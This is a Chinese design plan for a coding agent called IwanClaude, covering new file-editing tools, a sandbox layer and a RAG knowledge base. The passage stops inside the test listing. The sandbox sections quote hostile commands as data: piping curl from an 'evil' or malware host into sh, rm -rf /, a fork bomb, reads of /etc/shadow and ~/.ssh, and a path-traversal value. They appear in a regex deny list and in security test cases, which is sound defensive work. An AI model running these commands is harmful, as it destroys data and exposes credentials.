# IwanClaude S8 改进计划书：沙箱系统 + RAG 知识库 + 精修编辑器 + 工具补全

> 版本：v1.0  
> 日期：2026-07-14  
> 基线版本：IwanClaude v0.0.1（S0~S7 已完成，项目骨架→S7 Multi-agent/Skills/MCP）  
> 存放路径：`docs/plans/S8_sandbox_rag_editor_plan.md`

---

## 一、执行摘要（为什么要做 S8）

当前 IwanClaude 在 S0~S7 已经具备了 Agent 循环、权限审批、多智能体、MCP 协议、终端 UI 等基础能力，但在三个核心维度上缺失了生产级能力：

1. **🔧 工具能力太粗糙（精修编辑器缺失）**：现有 [write_file](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/write_file.py) 只能**全量覆盖写入**，无法做到"光标定位到指定行范围然后修改"、"按字符串搜索替换"、"插入/删除单行"这类精修操作。这导致 IwanClaude **只能写新代码，不能改旧代码**——哪怕只想在 300 行的文件里改 1 行，也得让 LLM 把 300 行重新生成一遍再全量覆盖，既浪费 token 又容易误改。
2. **🛡️ 完全无沙箱（危险）**：现有 [BashTool](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/bash.py) 直接 `asyncio.create_subprocess_exec("powershell.exe", ...)` 在用户的真实宿主机上执行命令，`rm -rf /`、`format C:`、`curl http://malware | sh` 这类命令只靠 [PermissionManager](file:///d:/IwanClaude/src/iwan_claude/core/permissions/manager.py) 的"用户点同意"审批流程来拦。这是**管理手段不是技术手段**，用户误点同意或被 prompt injection 绕过就会真的破坏系统。
3. **📚 无 RAG（失忆 + 不会查资料）**：现有 [memory/loader.py](file:///d:/IwanClaude/src/iwan_claude/core/memory/loader.py) 只是读取 `context.md` 静态文件，没有向量分块、语义检索、知识库索引。IwanClaude 既**记不住 1 小时前和用户的对话**（只靠上下文压缩），也**不会查用户本地的文档/代码库/笔记**。

S8 的目标是在 2~3 周内把这三块能力补齐，按"先易后难、可独立交付"的顺序拆成 **4 个阶段**：阶段 0 基础工具补全 → 阶段 1 精修编辑器 → 阶段 2 沙箱系统 → 阶段 3 RAG 知识库。每个阶段结束都有独立的验收标准和单元测试。

---

## 二、现状基线分析

### 2.1 现有项目架构总览

参考 [runner.py](file:///d:/IwanClaude/src/iwan_claude/core/runner.py) 的装配关系，S7 已完成的模块如下：

```
AgentRunner（总装配）
├── AgentLoop [loop.py]             # Plan→Act→Observe 循环，S1 完成
├── ToolRegistry + BuiltinTools     # 工具注册表（S3 完成，能力粗糙）
│   ├── ReadFileTool                # 只读（无行号、无分页读）
│   ├── WriteFileTool               # 只覆盖写（无局部修改 ← 问题点①）
│   ├── ListDirTool / NoteSaveTool  # 目录 + 笔记
│   ├── BashTool                    # 直接宿主机执行（无沙箱 ← 问题点②）
│   └── Task*Tools + SpawnAgentTool # 任务 + 子智能体，S7 完成
├── PermissionManager [permissions/]# 审批制（非技术隔离，S5 完成）
├── Session + EventBus              # 会话 + 事件总线，S2/S4 完成
├── Compactor [compact/]            # 上下文压缩（非 RAG，S6 完成）
├── Memory [memory/loader.py]       # 只读 context.md（无向量、无检索 ← 问题点③）
├── MCPManager [mcp/]               # MCP 协议桥接，S7 完成
└── TUI [tui/app.py]                # 终端 UI，S4 完成
```

### 2.2 现有工具能力边界（为什么不能"光标修改"）

逐行分析当前 builtin 工具：

| 工具 | 现有能力 | 缺失能力（S8 要补） |
|---|---|---|
| [ReadFileTool](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/read_file.py) | 读全文件、512KB 截断、禁 `..` 穿越 | ❌ 不显示**行号**；❌ 不能按 `(start_line,end_line)` 范围读；❌ 不能按字节 offset 分页读大文件；❌ 截断后不返回总行数/总字节数，LLM 不知道还有多少内容漏了 |
| [WriteFileTool](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/write_file.py) | 覆盖写、创建父目录、1MB 限制 | ❌ 没有任何精修模式；❌ 不能范围替换行；❌ 不能按字符串搜索替换；❌ 不能按行号插入/删除；❌ 没有 mode 参数（append 追加、fail_if_exists 避免误覆盖）；❌ 写前不自动备份 |
| [BashTool](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/bash.py) | 子进程 shell、超时、截断 | ❌ 无文件系统根白名单；❌ 无资源限制（CPU/内存/PID数）；❌ 无网络开关；❌ 无可配置黑名单（禁 `rm -rf /`、禁 `curl\|sh` 等高危模式）；❌ 无自动清理临时文件；❌ 没有隔离后端选择（Docker/tempdir/native） |
| ListDirTool / NoteSaveTool / Task* | OK，S3/S7 完成 | ➕ 补一批兄弟工具：delete_file/rename/find_files/grep_search/mkdir/stat 等 |

### 2.3 现有 Memory 与 RAG 的差距

[memory/loader.py](file:///d:/IwanClaude/src/iwan_claude/core/memory/loader.py) 只有 `load_context_file(path)` 一个函数，读 `~/.iwan/context.md` 和 `./.iwan/context.md` 两个静态文件拼到 system prompt 里。RAG 所需的 5 层能力全没有：

| RAG 能力层 | 现有 | S8 目标 |
|---|---|---|
| ① 文档分块（Chunking） | ❌ | Markdown 按标题分层、Python 按 AST 符号分块、纯文本滑动窗口重叠 |
| ② 向量嵌入（Embedding） | ❌ | 复用现有 HTTP 客户端走 OpenAI 兼容 `/embeddings` 接口（DeepSeek/Ollama 都兼容） |
| ③ 向量存储（VectorStore） | ❌ | FAISS 本地零依赖（个人项目） + Chroma 持久化（可插拔） |
| ④ 索引管理（Indexing） | ❌ | 目录递归索引、文件监听增量更新、状态查询（已索引 chunks/token） |
| ⑤ 检索工具（Retrieval API） | ❌ | `search_knowledge` + `index_knowledge` + `forget_knowledge` 三个 tool 暴露给 Agent |

---

## 三、S8 改进方向总览

S8 拆成 **4 个独立阶段**，每个阶段可以单独 PR、单独跑测试、单独验收：

```
阶段 0（低难度·1 天）  基础工具补全
    └─ delete_file / rename_file / copy_file / mkdir / file_stat
    └─ find_files + grep_search（文件+内容搜索双引擎）
    └─ run_python_code（字符串运行 Python，作为 bash 的安全替代品）
    └─ WriteFileTool 加 mode 参数（append / overwrite / fail_if_exists）

阶段 1（中难度·2 天）  精修文件编辑器（解决"光标修改"核心诉求）
    └─ view_file = read_file 超集（带行号 + 范围读 + 分页 + 总行数）
    └─ edit_by_lines    （行范围替换 = "光标从第 12 行到第 45 行替换为..."）
    └─ edit_by_search   （字符串精确匹配替换，多匹配歧义报错）
    └─ insert_at_line   （行号前/后插入文本，不删原内容）
    └─ delete_lines     （删除指定行范围）
    └─ 所有写操作统一走自动备份机制（.iwan/backups/<ts>_<path>.bak）

阶段 2（中高难度·3 天）  沙箱系统（把 Bash + 文件工具全包一层可配置隔离）
    └─ SandboxConfig  数据类 + 路径白名单/网络开关/资源限制/命令黑名单
    └─ SandboxManager 管理生命周期（tempdir 后端 / Docker 后端 / none 后端）
    └─ BashTool  重构：从直调 subprocess → 委托 SandboxManager.run_command()
    └─ 所有 FS 工具统一走 path_is_allowed() 前置校验
    └─ 与 PermissionManager 集成（审批制 + 沙箱双层防护）

阶段 3（高难度·4 天）  RAG 知识库
    └─ DocumentChunker（Markdown/Python/TXT 三分块策略）
    └─ EmbeddingProvider（复用 HTTP 客户端，OpenAI 兼容）
    └─ VectorStore 抽象 + FAISS 实现 + Chroma 实现
    └─ KnowledgeIndexManager（目录索引 + 增量更新 + 持久化）
    └─ search_knowledge / index_knowledge / forget_knowledge 三个 Agent 工具
    └─ SystemPrompt 集成：引导 LLM 在回答前先检索知识库
```

预估总工作量：**10 个工作日**（不含集成测试和 bug fix）。预估新增代码：约 2500~3500 行 Python + 10 个新 builtin 工具。

---

## 四、阶段 0 详细设计：基础工具补全（1 天）

> 编号：S8.0  
> 依赖：无（可立刻开工）  
> 验收：12 个单元测试 + 1 个集成测试全部通过

### 4.1 新增工具清单

每个工具都放在 `src/iwan_claude/core/tools/builtin/` 下，新文件 `fs_ops.py` 和 `search.py`，避免把 10 个类堆到 `bash.py` 或 `write_file.py` 里。

#### 4.1.1 文件操作六件套（`fs_ops.py`）

```
delete_file(path)          # 删除文件/空目录（非空目录走配置：默认报错，加 force=True 递归删，强制触发审批）
rename_file(src, dst)      # 重命名/移动（同分区原子，跨分区复制再删）
copy_file(src, dst)        # 复制文件（默认不覆盖已有文件，加 overwrite=True 才覆盖）
mkdir(path, parents=True)  # 创建目录，等价 mkdir -p
file_stat(path)            # 返回 size/mtime_ctime_atime/permissions/line_count/file_ext 的 JSON
file_exists(path)          # 布尔型快捷工具（减少 read_file 抛 FileNotFoundError）
```

通用约束（所有 FS 工具统一）：
- 路径必须相对 CWD，禁止 `..` 穿越（复用现有 `if ".." in Path(p).parts: raise PermissionError`）
- 参数校验走 Pydantic `BaseModel + ConfigDict(extra="ignore")`（和现有 [BashParams](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/bash.py#L17) 风格一致）
- 所有写操作（delete/rename/copy/mkdir）在阶段 2 之前先复用 PermissionManager 做审批，阶段 2 后再集成沙箱

#### 4.1.2 搜索双引擎（`search.py`）

```
find_files(
  root=".",
  name_pattern="*.py",            # glob 模式，默认 None 不筛名
  content_pattern=r"def\s+test",  # 正则内容模式，默认 None
  max_depth=3,
  max_results=50,
)                                  # 按文件名/内容双筛，返回 (path, line_num, snippet) 列表

grep_search(
  pattern=r"TODO|FIXME",
  include="*.py",
  exclude=["tests/**", ".venv/**"],
  max_matches=200,
)                                  # 纯内容搜索，等价 grep -rn（复用 ripgrep 如果可用，否则纯 Python re 扫描）
```

#### 4.1.3 `run_python_code`（安全代码执行）

```
run_python_code(
  code_str: str,
  timeout: int = 30,
  pip_install: list[str] | None = None,  # 先临时装依赖再跑（阶段 2 沙箱后才开，当前阶段先抛 NotImplementedError）
)
```

当前阶段：用隔离的临时 venv 跑（避免污染用户全局环境）；阶段 2 沙箱后直接在 tempdir 沙箱容器里跑。作为 BashTool 的替代品供 IwanClaude 跑自己写的测试脚本/数据分析代码，比 `bash "python script.py"` 更可控。

#### 4.1.4 改造 [WriteFileTool](file:///d:/IwanClaude/src/iwan_claude/core/tools/builtin/write_file.py)：加 mode 参数

在 `WriteFileParams` 里加：
```python
mode: Literal["overwrite", "append", "fail_if_exists"] = "overwrite"
```
- `overwrite` = 现有行为（默认，向后兼容）
- `append` = `path.write_text(..., mode="a")`，在文件末尾追加（适合日志、配置项追加）
- `fail_if_exists` = 已存在就报错，避免 IwanClaude 手滑覆盖用户的重要文件

另外写前自动备份：如果目标文件已存在且 mode=overwrite，先 `copy2(path, BACKUP_DIR / f"{ts}_{path.name}.bak")`，`BACKUP_DIR = Path("./.iwan/backups/")`，用户可随时回滚。

### 4.2 阶段 0 验收标准

- [ ] `tests/unit/test_fs_ops.py`：6 个 FS 工具 × 2~3 个用例 = 12 个 UT
- [ ] `tests/unit/test_search_tools.py`：find_files + grep_search 各 3 用例 = 6 个 UT
- [ ] `tests/unit/test_write_file_modes.py`：append / fail_if_exists / 自动备份 3 用例
- [ ] `tests/integration/test_s8_baseline.py`：一次 run 里同时调用 delete+rename+find+append 不出错
- [ ] 所有新工具在 `runner._build_registry()` 里正确注册，Agent 实际调用能看到正确 schema

---

## 五、阶段 1 详细设计：精修文件编辑器（2 天）

> 编号：S8.1  
> 前置依赖：S8.0（复用自动备份、路径校验通用代码）  
> 验收：20 个单元测试 + 代码精修 e2e 测试（改 500 行文件的 3 行不影响其他内容）

### 5.1 核心设计思想：LLM 修代码 ≠ 重写全文件

用户最原始的诉求：**"光标移动到任意位置然后开始修改"**。翻译成给 IwanClaude 的工具 API，有两种等价语义：

- **行号坐标法**（"我先 view_file 看到了第 142~148 行是旧函数，让你把这几行换成新的"）→ 对应 `edit_by_lines`
- **内容锚点法**（"我不想数行号，就想把函数体内那段'old code 123'替换成新的"，适合行号会变的重构场景）→ 对应 `edit_by_search`

这两种都要做，并且**在结果里返回验证信息**：让 LLM 调完工具后立刻看到"替换后第 140~150 行变成什么样了"，不用再 view_file 查一遍。

### 5.2 工具详解

全部放进 `src/iwan_claude/core/tools/builtin/editor.py` 新文件，所有工具返回的结果末尾自动附加"**[edit summary: lines_changed X, bytes_delta +Y]** + 替换后上下文 5 行预览"，减少 LLM 二次 view_file。

#### 5.2.1 `view_file`（ReadFileTool 的超集）

```
参数:
  path: str
  start_line: int | None = None   # 起始行号（1-based，inclusive）
  end_line: int | None = None     # 结束行号（inclusive）
  offset_bytes: int | None = None # 按字节偏移读（和行号范围互斥，同时传就报错）
  limit_bytes: int | None = None
  show_line_numbers: bool = True  # 默认显示，格式 "{:>6} | {}"

返回:
  正文带行号 + 尾部总结：
  "[File: src/foo.py | lines: 428 total | shown: 120-157 (38 lines) | size: 14.2 KB]"
```

#### 5.2.2 `edit_by_lines`（行范围替换 = "光标选一段替换"）

```
参数:
  path: str
  start_line: int (1-based, inclusive)
  end_line:   int (inclusive, ≥ start_line)
  replacement: str   # 替换后的内容（多行字符串即可）
  dry_run: bool = False  # True 的话只返回 diff，不落盘，供 LLM 先预览再决定

校验:
  - end_line ≤ 总行数，否则报错
  - 执行前自动备份（复用阶段 0 的备份代码）

返回:
  "✓ Replaced lines 142-148 (7 lines old → 9 lines new, +2 lines net)
   --- diff preview (old 3 / new 3, lines 140-150 post-edit) ---
   140 |     old line
   141 |     old line
   142 | >>> new line 1
   143 | >>> new line 2
   144 | >>> new line 3
   ...
  [bytes_delta: +124 | backup: .iwan/backups/20260714T1530_foo.py.bak]"
```

#### 5.2.3 `edit_by_search`（字符串锚点替换）

```
参数:
  path: str
  search: str            # 要搜索的字符串（精确匹配，多行也可以）
  replace: str           # 替换后的字符串
  occurrence: int | Literal["all"] = 1
                       # =1 替换第 1 次匹配；=N 替换第 N 次；="all" 替换全部
  dry_run: bool = False

校验（歧义保护，这是关键！）:
  - 如果匹配次数 > 1 且 occurrence 是 int（不是 "all"）：
    ✓ occurrence 指定了具体 N 且 N ≤ 匹配数 → OK
    ✗ 没指定 occurrence 且匹配多 → 报错，返回匹配清单让 LLM 选 occurrence
      "Ambiguous: search matched 5 times at lines [12, 45, 102, 222, 340].
       Set occurrence=N to pick one, or occurrence='all' to replace all.
       Snippet of match #1:\n..."
```

这是 LLM 日常改代码最常用的工具。**多匹配保护**避免手滑把 10 个同名变量一起改错了。

#### 5.2.4 `insert_at_line`（纯插入不删除）

```
参数:
  path: str
  line_number: int
  text: str
  position: Literal["before", "after"] = "after"  # 在 line_number 这一行的前/后插
```

#### 5.2.5 `delete_lines`（纯删除）

```
参数:
  path: str
  start_line: int
  end_line: int
```

### 5.3 阶段 1 验收标准

- [ ] `tests/unit/test_editor_view.py`：view 行范围、字节范围、行号格式、截断提示 5 UT
- [ ] `tests/unit/test_editor_edit_lines.py`：单替换、替换后变长、dry_run、边界行（1~1、最后一行）6 UT
- [ ] `tests/unit/test_editor_edit_search.py`：单匹配、多匹配歧义报错、occurrence=N、occurrence=all、空搜索串 7 UT
- [ ] `tests/unit/test_editor_insert_delete.py`：插入 4 场景（首行前、末行后、中间 before/after）+ 删除 2 场景 = 6 UT
- [ ] **关键 E2E** `tests/integration/test_editor_real_code_refactor.py`：创建一个 500 行模拟 Python 项目（含 10 个函数），调 `edit_by_search` 把中间某函数体替换并加参数，断言：① 目标函数真的改了 ② 其他 9 个函数的字节级内容完全不变（这才能证明"真的只改了那一段"）

---

## 六、阶段 2 详细设计：沙箱系统（3 天）

> 编号：S8.2  
> 前置依赖：S8.0（所有 FS 工具已补全）  
> 验收：沙箱安全测试 8 用例全部通过（尝试越权都失败）；BashTool 现有 UT 在沙箱后端全通

### 6.1 架构分层

沙箱系统分 4 层，从配置到执行：

```
SandboxConfig（数据类：我要什么样的隔离？）
    │
    ▼
SandboxManager（按 backend 实例化对应实现）
    ├── NativeSandbox   （后端=none：无隔离，当前行为 + 软限制，默认仅在显式配置 danger_mode=True 时允许）
    ├── TempdirSandbox  （后端=tempdir：把项目目录 rsync/copytree 到系统临时目录，所有命令/文件操作在 tempdir 里跑，跑完可配置清理）
    └── DockerSandbox   （后端=docker：用官方 python:3.12-slim 镜像，--cpus/--memory/--read-only 挂载卷，Windows 下自动降级到 TempdirSandbox 并警告）
    │
    ▼
统一 API：run_command() / read_file_sandboxed() / write_file_sandboxed() / cleanup()
    │
    ▼
调用方：BashTool / ReadFileTool / 所有 FS 工具（从直调 IO 改成注入 SandboxManager 实例调用）
```

### 6.2 [SandboxConfig](file:///d:/IwanClaude/src/iwan_claude/core/config.py) 字段设计

在现有 `IwanConfig` 里加一个 `sandbox` 子配置类：

```python
class SandboxConfig(BaseModel):
    # 后端选择
    isolation_backend: Literal["auto", "none", "tempdir", "docker"] = "auto"
    #   auto = Linux+有docker → docker；Windows → tempdir；其他 → none

    # 文件系统白名单（所有 FS 操作只能碰这些目录下的，默认仅 CWD）
    filesystem_roots: list[str] = ["."]
    allow_path_traversal: bool = False  # 强制 False，可显式 True 但警告
    forbidden_path_globs: list[str] = [   # 永远禁止访问
        "~/.ssh/*", "~/.aws/*", "~/.kube/*",
        "C:\\Windows\\System32\\*", "/etc/shadow", "/etc/passwd",
    ]

    # 网络开关（默认禁止，危险动作）
    allow_network: bool = False
    allow_network_domains: list[str] = []  # 白名单域名，allow_network=True 才生效

    # 资源限制（软限制 + Docker 硬限制；单位：MB / 秒 / 个数）
    max_memory_mb: int = 512
    max_cpu_pct: int = 100
    max_processes: int = 64
    max_disk_mb: int = 2048

    # 命令黑名单（正则匹配 command 字符串直接拒，连审批都不给）
    forbidden_command_patterns: list[str] = [
        r"rm\s+-rf\s+/", r"mkfs\.", r"dd\s+if=",   # 破坏型
        r"curl\s+.*\|\s*(?:sh|bash)",               # 管道执行
        r"wget\s+.*\|\s*(?:sh|bash)",
        r":(?:\s*);\s*\{s*:\s*\|\s*:;\s*\}&\s*fork",  # fork bomb
        r"chmod\s+-R\s+777\s+/",
    ]

    # 临时目录保留策略（调试用）
    keep_tempdir_after_run: bool = False  # True 的话跑完不删 tempdir，留现场分析
```

### 6.3 SandboxManager + 三个后端实现

新建 `src/iwan_claude/core/sandbox/` 目录（S2-S7 都有单模块目录，延续风格）：
```
sandbox/__init__.py
sandbox/config.py      → SandboxConfig（如果不想放 IwanConfig 里）
sandbox/base.py        → ABC：BaseSandbox（run_command/read/write/stat/cleanup 抽象）
sandbox/native.py      → NativeSandbox
sandbox/tempdir.py     → TempdirSandbox（copytree 到 tempfile.mkdtemp，所有路径映射到 tempdir_root）
sandbox/docker.py      → DockerSandbox（docker run -v 挂载卷，--network none 默认）
sandbox/manager.py     → SandboxManager（根据 backend 选实现，复用单例，生命周期绑定到 run_id）
```

核心 API（`BaseSandbox` 抽象）：
- `async run_command(command: str, timeout: int) → SandboxCommandResult(stdout, stderr, exit_code, killed_reason, resources_used)`
- `read_file_sandboxed(path) → bytes`（路径先过 `resolve_sandboxed_path(path)` 映射，不在白名单就抛 PermissionError）
- `write_file_sandboxed(path, bytes) → None`（同上）
- `async cleanup() → None`（删 tempdir、停容器）

### 6.4 现有工具集成方式

1. **BashTool**：构造函数加 `sandbox: SandboxManager | None = None` 参数，有就走 `sandbox.run_command()`，没有就走现有直调 subprocess（向后兼容）。`runner._build_registry` 里实例化 BashTool 时把 sandbox 注入进去。
2. **所有 FS 工具**：在 `invoke()` 开头加 2 行校验：
   ```python
   if self._sandbox and not self._sandbox.path_is_allowed(p.path):
       raise PermissionError(f"path not in sandbox roots: {p.path}")
   ```
   同时写操作的路径也走 `resolve_sandboxed_path()`（映射到 tempdir/容器卷内），读操作同理。
3. **PermissionManager 集成**：审批流程保留，但审批发生在"**沙箱校验通过后**"——先技术层面硬拦（沙箱），再用户层面软拦（审批），双层防护。沙箱已经拒绝的命令（比如 `rm -rf /` 命中黑名单）直接返回错误，根本不走到审批弹窗。

### 6.5 阶段 2 验收标准

8 个沙箱安全 UT（每个都必须**严格断言失败**，反过来证明沙箱生效）：
- [ ] `test_sandbox_forbidden_roots_bash`：尝试 `bash "cat /etc/shadow"`（不在 filesystem_roots 内）→ PermissionError + 命令根本没执行
- [ ] `test_sandbox_forbidden_command_pattern`：bash 输入 `curl http://evil | sh` → 命中黑名单直接拒绝
- [ ] `test_sandbox_network_default_blocked`：默认配置下 `bash "curl https://baidu.com"` → 因 `allow_network=False` 失败
- [ ] `test_sandbox_tempdir_isolation`：tempdir 后端下写 `/tmp/evil.txt`，宿主机真实 `/tmp/evil.txt` 不存在
- [ ] `test_sandbox_docker_cgroup_limit`：docker 后端下 `bash "stress-ng --vm 1 --vm-bytes 1G"` → 因 max_memory_mb=512 被 OOM kill
- [ ] `test_sandbox_path_traversal_blocked`：edit_by_lines 参数 `path="../../etc/passwd"` → 抛 PermissionError（沙箱层+现有工具层双校验）
- [ ] `test_sandbox_keep_tempdir_debug`：配置 keep_tempdir_after_run=True，跑完后 tempdir 目录仍在，能看到留下的中间文件
- [ ] `test_sandbox_bash_legacy_ut_pass`：BashTool 现有所有 UT（`tests/unit/test_builtin_tools.py` 里的）在默认 auto 后端下全通（不引入回归）

---

## 七、阶段 3 详细设计：RAG 知识库（4 天）

> 编号：S8.3  
> 前置依赖：S8.0（find_files 工具用于索引前扫描）  
> 验收：本地索引 10 份 MD + Python 文件，用 10 个语义查询检索，命中率 ≥ 9/10

### 7.1 模块结构

延续现有项目风格，新模块目录 `src/iwan_claude/core/rag/`：

```
rag/__init__.py
rag/chunker.py        # DocumentChunker（三分块策略）
rag/embedding.py      # EmbeddingProvider（复用 httpx）
rag/vectorstore.py    # VectorStore 抽象 + FAISS impl + Chroma impl
rag/index.py          # KnowledgeIndexManager（索引管理）
rag/retrieval.py      # 向量检索 + 重排（简单 BM25 rerank，可选）
rag/tools.py          # search_knowledge / index_knowledge / forget_knowledge 三个 Agent 工具类
```

### 7.2 Chunker（分块器）设计

核心原则：**每个 chunk 都带元数据，保证检索后能追溯到"源文件 + 哪一行 + 哪个函数/章节"**。

```python
class Chunk(BaseModel):
    text: str                           # 分块后的文本内容
    source_path: str                    # 源文件相对路径
    start_line: int; end_line: int      # 在源文件中的行范围（1-based）
    symbol: str | None = None           # 如果是代码块，对应的类名/函数名（AST 解析来的）
    section_path: list[str] | None = None  # 如果是 Markdown，对应 ["S8", "7.2 Chunker"] 这种标题层级路径
    chunk_id: str = Field(default_factory=lambda: uuid4().hex[:12])
    metadata: dict[str, Any] = {}       # 扩展字段（文件类型、mtime、token数等）
```

三种分块策略（按扩展名分派）：

| 文件类型 | 分块算法 |
|---|---|
| `.py` | 用 `ast.parse` 遍历，按 `ClassDef / FunctionDef / AsyncFunctionDef / Module` 的 body 切分，每个符号独立 chunk；顶层注释和 import 合成一个 chunk；不足 100 token 的相邻 chunk 合并 |
| `.md` / `.markdown` | 用正则匹配 `^#{1,6}\s` 标题行，按层级切（`##` 标题下所有内容直到下一个同级/上级标题）为一个 chunk；超长 section 再按滑动窗口（512 token/块，重叠 64 token）二次切 |
| 其他（.txt/.toml/.json 等） | 纯文本滑动窗口：默认 chunk_size=512 UTF-8 字符（非 token，避免依赖 tokenizer），overlap=64；可配置 |

通用后处理：对每个 chunk 自动注入 `metadata["header_context"]`：
- 代码 chunk：`"def foo(x, y) -> str:"` 这一行签名（方便 LLM 检索到后立刻知道这是哪个函数的实现）
- Markdown chunk：标题层级 `"# IwanClaude / ## S8 改进 / ### 7.2 Chunker"` 全路径

### 7.3 EmbeddingProvider

复用现有 `httpx.AsyncClient`（[openai_compat.py](file:///d:/IwanClaude/src/iwan_claude/core/llm/openai_compat.py) 里已有），单独写 Embedding 端点：

```python
class EmbeddingProvider:
    def __init__(self, base_url: str, api_key: str, model: str):
        # base_url 直接用现有 IwanConfig.llm.base_url（DeepSeek Anthropic 兼容端点）
        # model 配置项新增 rag.embedding_model = "deepseek-embed-v3"（可覆盖）

    async def embed(self, texts: list[str], batch_size: int = 32) -> list[list[float]]:
        # 分批请求，避免大索引一次请求 1000 chunks 超时
        # 返回每个 text 对应 dim=1536（deepseek）或 768/4096 的向量
```

### 7.4 VectorStore（可插拔 + 本地零依赖优先）

两层抽象：优先 FAISS（纯本地文件，零依赖额外进程），可选 Chroma（持久化+元数据过滤更方便）。

```python
class VectorStore(ABC):
    async def add(self, chunks: list[Chunk], vectors: list[list[float]]) -> None: ...
    async def delete(self, chunk_ids: list[str]) -> None: ...
    async def delete_by_source(self, source_path: str) -> None: ...  # 源文件变更后清旧索引
    async def search(self, query_vector: list[float], top_k: int = 5,
                     filters: dict[str, Any] | None = None) -> list[tuple[Chunk, float]]:
        # 返回 [(chunk, 相似度分数)] 列表，分数越大越相似
        # filters 支持按 source_path / symbol / section_path 过滤

class FAISSVectorStore(VectorStore):
    # 用 faiss.IndexFlatIP（内积 = cosine，前提是向量先 L2 归一化）
    # 持久化：save() 把 index + chunk_store.pkl 写到 `.iwan/rag_index/faiss.bin`

class ChromaVectorStore(VectorStore):  # 可选实现，需要 pip install chromadb
    # 走 Chroma Python SDK，collection = "iwanclaude_knowledge"
```

### 7.5 KnowledgeIndexManager（索引管理器）

```python
class KnowledgeIndexManager:
    # 一键索引目录
    async def index_directory(
        self, root: str = ".",
        include: list[str] = ["**/*.py", "**/*.md"],
        exclude: list[str] = [".git/**", "node_modules/**", ".venv/**"],
        incremental: bool = True,  # 默认增量：只重索引 mtime 变更的文件
    ) -> IndexResult:
        # 返回: added_chunks=N, updated_chunks=M, deleted_chunks=K, total_tokens=T

    # 单文件索引（文件保存事件触发）
    async def index_file(self, path: str) -> None: ...
    async def remove_file(self, path: str) -> None: ...

    # 状态查询
    def status(self) -> IndexStatus:
        # return {total_chunks, total_sources, last_indexed_at, index_size_bytes}
```

持久化：`.iwan/rag_index/` 下存：
- `faiss.bin`（或 chroma.sqlite3）
- `index_meta.json`（每个源文件的 mtime/chunk_ids 映射，增量索引用）
- `chunks_store.jsonl`（所有 Chunk 对象的 JSONL 备份，方便 FAISS 索引损坏后重建）

### 7.6 暴露给 Agent 的三个工具

放进 `rag/tools.py`，在 `runner._build_registry` 里条件注册（只有 config.rag.enabled=True 时才注册，避免默认配置下多 3 个 schema 打扰）：

| 工具名 | 作用 | 参数 |
|---|---|---|
| `search_knowledge` | 语义检索 | `query: str, top_k=5, filters: dict\|None` → 返回 top_k 个 chunk 的"源路径+行号+符号+正文"格式化文本 |
| `index_knowledge` | 手动触发索引 | `paths: list[str]`（支持文件或目录）→ 返回 index_directory 的结果摘要 |
| `forget_knowledge` | 移除某文件/目录索引 | `paths: list[str]` |

### 7.7 SystemPrompt 集成

在 [build_base_system_prompt](file:///d:/IwanClaude/src/iwan_claude/core/system_prompt.py#L17) 里末尾追加一段 RAG 行为引导（仅当 rag 工具被注册时才追加，用参数控制）：

```
[Knowledge Retrieval Guidance]
You have access to a local knowledge base (RAG) indexed from files under the project.
Before answering questions that:
  (a) require details about existing code/documentation you haven't seen,
  (b) reference specific symbols, filenames, or sections you're unsure about,
  (c) involve tasks spanning more than 2 files,
FIRST call `search_knowledge(query)` with a concise semantic query, get relevant context,
THEN reason and use tools. Do NOT guess API signatures or code contents from memory.
When you find stale/incorrect search results, call `index_knowledge` to refresh the index.
```

### 7.8 阶段 3 验收标准

- [ ] `test_chunker_py.py`：AST 分 3 个函数 + 1 个类 → 4 chunks + 符号 + 行号正确
- [ ] `test_chunker_md.py`：3 层标题（#/##/###）共 7 段内容 → 7 chunks + section_path 正确
- [ ] `test_embedding_provider.py`：5 个短文本 batch embed → 返回 5 个 1536 维向量，全部 L2 归一化
- [ ] `test_vectorstore_search.py`：加 20 个 chunks，搜 `What is IwanClaude's sandbox architecture?` → top-1 命中正确 chunk（分数 ≥ 0.8）
- [ ] `test_index_incremental.py`：第一次 index 全量，第二次仅改 1 个文件 → IndexResult 只显示 updated_chunks=1，其他不变
- [ ] `test_e2e_rag_retrieval_accuracy.py`：准备 10 文档（5 代码 5 MD），准备 10 个故意语义不直白的查询（不用字面关键词），命中 ≥ 9 个才算通过
- [ ] 所有 rag 工具在 SystemPrompt 里有行为引导，LLM 在真实对话里**遇到不认识的代码会先 search_knowledge**（集成测试可以用 mock LLM，看工具调用顺序是否正确）

---

## 八、新增依赖清单（pyproject.toml 更新内容）

阶段 0/1 **零新增依赖**（全部用标准库 pathlib/ast/re/tempfile/shutil 搞定）。

阶段 2 沙箱：
```toml
# pyproject.toml dependencies 新增（可选依赖，不用 Docker 可以不装）
dependencies = [
  ...,
  "docker>=7.0",       # DockerSandbox 用（Windows/macOS 没 Docker 自动降级，不强制）
]
```
并且在 `SandboxManager` 初始化时：`try: import docker` 失败就自动 warn "docker SDK 未装，降级到 tempdir"。

阶段 3 RAG：
```toml
dependencies = [
  ...,
  "faiss-cpu>=1.8",         # FAISS 向量库（CPU 版够个人项目用，零 GPU 依赖）
  # 可选依赖（用户自己 pip install iwan[rag-full] 才装）
]
[dependency-groups]
rag-full = [
  "chromadb>=0.5",         # Chroma 持久化实现
  "tiktoken>=0.7",         # 精确 token 计数（决定 chunk 大小）
  "watchdog>=4.0",         # 文件监听 → 增量索引自动触发
]
```
（可选依赖用 extras 或 dependency-groups 都可以，保持 [pyproject.toml](file:///d:/IwanClaude/pyproject.toml) 现有风格的话放到 `[dependency-groups]` 下更一致。）

---

## 九、集成测试与回归保护计划

### 9.1 新增测试目录结构

```
tests/
├── unit/
│   ├── test_fs_ops.py            # 阶段 0
│   ├── test_search_tools.py      # 阶段 0
│   ├── test_write_file_modes.py  # 阶段 0
│   ├── test_editor_*.py (x5)     # 阶段 1
│   ├── sandbox/
│   │   ├── test_sandbox_config.py
│   │   ├── test_tempdir_sandbox.py
│   │   ├── test_docker_sandbox_skip_on_windows.py  # mark.skipif(not docker)
│   │   └── test_sandbox_security.py (8 用例)        # 阶段 2
│   └── rag/
│       ├── test_chunker_*.py (x2)
│       ├── test_embedding_provider.py
│       ├── test_vectorstore_*.py (x2)
│       └── test_index_manager.py                   # 阶段 3
└── integration/
    ├── test_s8_0_baseline.py    # 阶段 0
